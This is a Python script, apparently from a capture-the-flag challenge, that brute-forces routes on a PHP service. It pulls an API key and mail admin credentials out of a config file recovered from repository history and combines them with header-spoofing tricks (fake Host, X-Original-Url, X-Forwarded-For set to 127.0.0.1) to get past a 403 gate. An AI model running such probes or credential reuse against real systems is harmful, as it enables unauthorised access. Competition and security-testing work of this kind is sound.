#!/usr/bin/env python
"""Probe the :8000 PHP service for a route that is not the uniform 403.

Ideas worth ruling out before assuming "guess the whitelist harder":
  * the vhost/router keys off the Host header (the recovered config talks about
    http://127.0.0.1:8025 and http://localhost/files/specs.7z, so an internal-Host gate is
    plausible); 443 happily serves /.git while :8000 403s it, which smells like a different
    front controller rather than a different document root;
  * proxy-level header rewrites (X-Original-Url / X-Rewritten-Url / X-Forwarded-*) that some
    routers honour;
  * the recovered INTERNAL_API_KEY as a header, combined with real paths.
Every response is deduplicated by (status, body) so a single different byte shows up.
"""
import http.client
import threading
from queue import Empty, Queue

HOST = "vec.web.2026.sunshinectf.games"
PORT = 8000
import re as _re

_CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = _re.search(r"INTERNAL_API_KEY.,\s*.([^']+).", _CFG).group(1)
MAIL_USER = _re.search(r"MAIL_ADMIN_USER.,\s*.([^']+).", _CFG).group(1)
MAIL_PASS = _re.search(r"MAIL_ADMIN_PASS.,\s*.([^']+).", _CFG).group(1)

PATHS = ["/", "/embed", "/embeddings", "/api", "/api/embeddings", "/search", "/query", "/topk",
         "/similar", "/nearest", "/collections", "/documents", "/db", "/flag", "/admin", "/debug",
         "/status", "/health", "/v1/embeddings", "/webmail", "/login", "/index", "/list",
         "/dump", "/export", "/openapi.json", "/.git/HEAD", "/api/status", "/api/search",
         "/api/embed", "/api/flag", "/api/query", "/api/db", "/chroma", "/vec", "/ingest",
         "/mail", "/messages", "/internal", "/api/internal", "/vector/search", "/api/v1/search"]

HEADERS = [
    {}, {"X-Api-Key": KEY}, {"Authorization": "Bearer " + KEY}, {"X-Internal-Api-Key": KEY},
    {"Host": "localhost"}, {"Host": "127.0.0.1"}, {"Host": "localhost:8000"},
    {"X-Forwarded-Host": "localhost"}, {"X-Original-Url": "/admin"}, {"X-Rewritten-Url": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"}, {"X-Real-IP": "127.0.0.1"}, {"Accept": "application/json"},
    {"X-Api-Key": KEY, "Host": "localhost"},
]

seen = {}
lock = threading.Lock()
Q = Queue()


def one(path, hdr):
    c = http.client.HTTPConnection(HOST, PORT, timeout=20)
    try:
        c.request("GET", path, headers=dict(hdr))
        r = c.getresponse()
        return r.status, r.read()[:180], dict(r.getheaders())
    except Exception as e:
        return type(e).__name__, b"", {}
    finally:
        try:
            c.close()
        except Exception:
            pass


def work():
    while True:
        try:
            path, i, hdr = Q.get_nowait()
        except Empty:
            return
        st, body, h = one(path, hdr)
        key = (st, bytes(body))
        with lock:
            new = key not in seen
            if new:
                seen[key] = (path, i)
        if new:
            print("%-22s hdr%-3d %-4s %s   %s" % (path, i, st, body[:110],
                                                  {k: v for k, v in h.items()
                                                   if k.lower() in ("allow", "location", "server")}),
                  flush=True)


if __name__ == "__main__":
    for p in PATHS:
        for i, h in enumerate(HEADERS):
            Q.put((p, i, h))
    ts = [threading.Thread(target=work, daemon=True) for _ in range(12)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(400)
    print("[*] %d distinct responses out of %d probes" % (len(seen), len(PATHS) * len(HEADERS)))
